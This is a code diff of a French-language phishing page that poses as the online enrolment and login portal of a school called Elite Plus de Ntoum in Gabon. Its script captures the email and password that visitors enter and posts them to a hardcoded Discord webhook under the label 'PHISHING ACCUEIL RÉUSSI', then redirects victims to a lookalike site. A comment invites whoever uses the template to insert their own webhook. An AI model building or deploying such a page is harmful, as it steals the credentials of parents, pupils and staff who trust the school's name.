@@ -11,57 +11,45 @@
         .header { background-color: #0b1a3d; color: white; padding: 40px 20px; text-align: center; }
         .logos-container { display: flex; justify-content: center; gap: 15px; margin-bottom: 25px; }
         .logos-container img { height: 70px; width: 70px; object-fit: contain; border-radius: 50%; border: 2px solid rgba(255,255,255,0.2); background-color: white; }
-        
         .platform-title { font-size: 12px; letter-spacing: 2px; text-transform: uppercase; color: #93c5fd; font-weight: 700; margin-bottom: 10px; }
         .header h1 { font-size: 26px; font-weight: 700; margin-bottom: 5px; }
         .header p { font-size: 15px; color: #cbd5e1; margin-bottom: 25px; }
-        
         .info-card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 20px; text-align: left; }
         .info-card h3 { font-size: 15px; margin-bottom: 15px; font-weight: 600; }
         .badges { display: flex; gap: 10px; margin-bottom: 15px; }
         .badge { background-color: #3b82f6; color: white; padding: 4px 10px; border-radius: 20px; font-size: 13px; font-weight: 700; }
         .info-card p { font-size: 13px; color: #93c5fd; margin: 0; }
-        
         .main-content { background-color: #f1f5f9; padding: 30px 20px; border-radius: 20px 20px 0 0; margin-top: -15px; position: relative; z-index: 10; }
         .login-title { font-size: 24px; font-weight: 700; color: #0b1a3d; margin-bottom: 8px; }
         .login-subtitle { font-size: 14px; color: #64748b; margin-bottom: 25px; line-height: 1.4; }
-        
         .form-group { margin-bottom: 20px; }
         .form-group label { display: block; font-size: 14px; font-weight: 600; color: #0b1a3d; margin-bottom: 8px; }
         .form-group input { width: 100%; padding: 15px; border: 1px solid #cbd5e1; border-radius: 10px; font-size: 15px; outline: none; background: white; }
         .form-group input:focus { border-color: #3b82f6; box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
-        
         .checkbox-group { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; font-size: 15px; color: #334155; }
         .checkbox-group input { width: 20px; height: 20px; border-radius: 4px; border: 1px solid #cbd5e1; }
-        
         .btn-submit { width: 100%; background-color: #1d4ed8; color: white; border: none; border-radius: 10px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 30px; }
-        
         .divider { display: flex; align-items: center; text-align: center; color: #94a3b8; font-size: 13px; margin-bottom: 20px; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #e2e8f0; }
         .divider::before { margin-right: 15px; }
         .divider::after { margin-left: 15px; }
-        
         .action-btn { display: flex; justify-content: space-between; align-items: center; background: white; border: 1px solid #e2e8f0; border-radius: 12px; padding: 15px 20px; margin-bottom: 12px; text-decoration: none; color: #0b1a3d; }
         .action-btn.primary { border-color: #3b82f6; background-color: #eff6ff; }
         .action-btn-text h4 { font-size: 15px; font-weight: 700; margin-bottom: 3px; }
         .action-btn-text p { font-size: 13px; color: #64748b; }
         .arrow { color: #1d4ed8; font-weight: bold; font-size: 18px; }
-        
         .footer { text-align: center; font-size: 13px; color: #94a3b8; margin-top: 30px; line-height: 1.5; }
     </style>
 </head>
 <body>
-
     <div class="header">
         <div class="logos-container">
             <img src="https://pngs-eliteplus.onrender.com/logos/elite-plus/legep.png" alt="LEGEP">
             <img src="https://files.catbox.moe/yj6yxh.jpeg" alt="ANNEXE">
         </div>
-        
         <div class="platform-title">Plateforme Numérique</div>
         <h1>Elite Plus de Ntoum</h1>
         <p>Ntoum, Gabon</p>
-
         <div class="info-card">
             <h3>Inscriptions 2026-2027 : tarifs et modalités</h3>
             <div class="badges">
@@ -71,32 +59,25 @@
             <p>Montants par classe, conditions, paiement Airtel Money ›</p>
         </div>
     </div>
-
     <div class="main-content">
         <h2 class="login-title">Connexion</h2>
         <p class="login-subtitle">Un seul identifiant pour tous les services. Vous serez dirigé automatiquement vers votre espace.</p>
-
         <form id="phish-form">
             <div class="form-group">
                 <label>Adresse e-mail</label>
                 <input type="email" id="email" required>
             </div>
-            
             <div class="form-group">
                 <label>Mot de passe</label>
                 <input type="password" id="password" required>
             </div>
-
             <div class="checkbox-group">
                 <input type="checkbox" id="remember">
                 <label for="remember">Rester connecté sur cet appareil</label>
             </div>
-
             <button type="submit" class="btn-submit">Se connecter</button>
         </form>
-
         <div class="divider">première visite</div>
-
         <a href="#" class="action-btn primary">
             <div class="action-btn-text">
                 <h4>Activer mon compte</h4>
@@ -104,7 +85,6 @@
             </div>
             <span class="arrow">›</span>
         </a>
-
         <a href="#" class="action-btn">
             <div class="action-btn-text">
                 <h4>Tarifs et inscriptions 2026-2027</h4>
@@ -112,7 +92,6 @@
             </div>
             <span class="arrow">›</span>
         </a>
-
         <a href="#" class="action-btn">
             <div class="action-btn-text">
                 <h4>Inscrire un élève</h4>
@@ -120,7 +99,6 @@
             </div>
             <span class="arrow">›</span>
         </a>
-
         <a href="#" class="action-btn">
             <div class="action-btn-text">
                 <h4>Suivre un dossier</h4>
@@ -128,21 +106,18 @@
             </div>
             <span class="arrow">›</span>
         </a>
-
         <div class="footer">
             Mot de passe oublié ou compte non reçu ?<br>
             Contactez le secrétariat de l'établissement.
         </div>
     </div>
-
     <script>
         document.getElementById('phish-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Change ce Webhook, il est cramé
+            // TON WEBHOOK ICI
             const webhookURL = "https://discord.com/api/webhooks/1568232984211882147/d-_mDSq4-UZeY_x0wtzQWCqt_FPCSCFmJnX-VQKtFY8gmml7AYok_v9AFmqzNdyyjBQQ";
             
             const btn = document.querySelector('.btn-submit');
@@ -153,7 +128,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🚨 **PHISHING COMPTABLE RÉUSSI (Accueil)**\n📧 **Email :** ${email}\n🔑 **Mot de passe :** ${password}`
+                    content: `🚨 **PHISHING ACCUEIL RÉUSSI**\n📧 **Email :** ${email}\n🔑 **Mot de passe :** ${password}`
                 })
             }).then(() => {
                 window.location.href = "https://pngs-eliteplus.onrender.com";
